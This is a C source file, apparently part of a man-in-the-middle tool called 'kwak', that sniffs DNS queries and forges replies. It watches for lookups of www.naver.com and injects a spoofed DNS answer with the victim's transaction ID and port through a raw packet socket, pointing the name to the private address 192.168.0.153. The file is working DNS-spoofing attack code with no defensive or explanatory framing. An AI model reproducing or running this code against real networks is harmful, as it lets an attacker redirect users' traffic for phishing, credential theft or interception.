#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <arpa/inet.h>
#include <netinet/udp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include "kwak.h"

extern int target_mac_addr_int[2][6];
extern char *target_ip_addr_char[2];

void dns_filter( const u_char *buffer )
{
  Gethdr *eth = ( Gethdr * )buffer;
  Giphdr *iph = ( Giphdr * )(buffer + sizeof(Gethdr));
  struct udphdr *udp = ( struct udphdr * )( buffer + sizeof( Gethdr ) + sizeof( Giphdr ));
  Gdnshdr *dns = ( Gdnshdr * )( buffer + sizeof( Gethdr ) + sizeof( Giphdr ) + sizeof( struct udphdr ));

  unsigned short td = dns->tid;
  u_int16_t port = udp->source;
  unsigned int d_src = iph->dst;

  if( dns->flag == 0x0001 ) {
    if( dns->name[5] == 0x6e ) {
      dns_send_reply( td, port, d_src );
    }
  }

}

void dns_send_reply( unsigned short td, u_int16_t dport, unsigned int d_src )
{

  int sock = 0;
  struct sockaddr_ll sll;

  Gethdr eth;
  Giphdr ip;
  Gdnshdr dns;
  struct udphdr udp;
  Gpseudohdr pseudo;

  bzero( &sll, sizeof( sll ) );
  sll.sll_family = PF_PACKET;
  sll.sll_ifindex = if_nametoindex( "eth0" );
  sll.sll_halen = 6;

  char gData[sizeof( eth ) + sizeof( ip ) + sizeof( udp ) + sizeof( dns )];

  sock = socket(PF_PACKET, SOCK_RAW, 0);

  eth.dst[0] = target_mac_addr_int[0][0];
  eth.dst[1] = target_mac_addr_int[0][1];
  eth.dst[2] = target_mac_addr_int[0][2];
  eth.dst[3] = target_mac_addr_int[0][3];
  eth.dst[4] = target_mac_addr_int[0][4];
  eth.dst[5] = target_mac_addr_int[0][5];
  eth.src[0] = target_mac_addr_int[1][0];
  eth.src[1] = target_mac_addr_int[1][1];
  eth.src[2] = target_mac_addr_int[1][2];
  eth.src[3] = target_mac_addr_int[1][3];
  eth.src[4] = target_mac_addr_int[1][4];
  eth.src[5] = target_mac_addr_int[1][5];
  eth.type = htons(0x0800);

  ip.ver = 0x04;
  ip.hlen = sizeof(ip) >> 2;
  ip.service = 0x00;
  ip.total = htons( sizeof( ip ) + sizeof( udp ) + sizeof( dns ));
  ip.id = htons( 0x0001 );
  ip.flag = 0x00;
  ip.offset = 0x00;
  ip.ttl = 0x40;
  ip.protocol = 17;
  ip.chk = 0x00;

  ip.src = d_src;
  ip.dst = inet_addr(target_ip_addr_char[0]);

  ip.chk = csum((unsigned short *)&ip, sizeof(ip));

  dns.tid = td;
  dns.flag = htons( 0x8180 );
  dns.questions = htons( 0x0001 );
  dns.answer = htons( 0x0001 );
  dns.authority = htons( 0x0000 );
  dns.add = htons(0x0000);
  dns.name[0] = 0x03;
  dns.name[1] = 0x77;
  dns.name[2] = 0x77;
  dns.name[3] = 0x77;
  dns.name[4] = 0x05;
  dns.name[5] = 0x6e;
  dns.name[6] = 0x61;
  dns.name[7] = 0x76;
  dns.name[8] = 0x65;
  dns.name[9] = 0x72;
  dns.name[10] = 0x03;
  dns.name[11] = 0x63;
  dns.name[12] = 0x6f;
  dns.name[13] = 0x6d;
  dns.name[14] = 0x00;
  dns.type = htons( 0x0001);
  dns.class = htons( 0x0001);
      
  dns.ans_name = htons( 0xc00c );
  dns.ans_type = htons( 0x0001 );
  dns.ans_class = htons( 0x0001 );
  dns.ans_ttl = htonl( 0x00003840 );
  dns.ans_dlen = htons( 0x0004 );
  dns.ans_addr = htonl( 0xc0a80099 );

  udp.source = htons(53);
  udp.dest = dport;
  udp.len = htons(sizeof(udp) + sizeof(dns));
  udp.check = 0x00;
  
  pseudo.src = ip.src;
  pseudo.dst = ip.dst;
  pseudo.zero = 0;
  pseudo.protocol = ip.protocol;
  pseudo.length = htons(sizeof(udp) + sizeof(dns));
      
  memcpy(&pseudo.udp, &udp, sizeof(udp));
  memcpy(&pseudo.dns, &dns, sizeof(dns));
      
  udp.check = csum((unsigned short *)&pseudo, sizeof(pseudo));

  memcpy(gData, &eth, sizeof(eth));
  memcpy(gData + sizeof(eth), &ip, sizeof(ip));
  memcpy(gData + sizeof(eth) + sizeof(ip), &udp, sizeof(udp));
  memcpy(gData + sizeof(eth) + sizeof(ip) + sizeof(udp), &dns, sizeof(dns));
     
  sendto(sock, gData, sizeof(gData), 0, (struct sockaddr *)&sll, sizeof(sll));

}

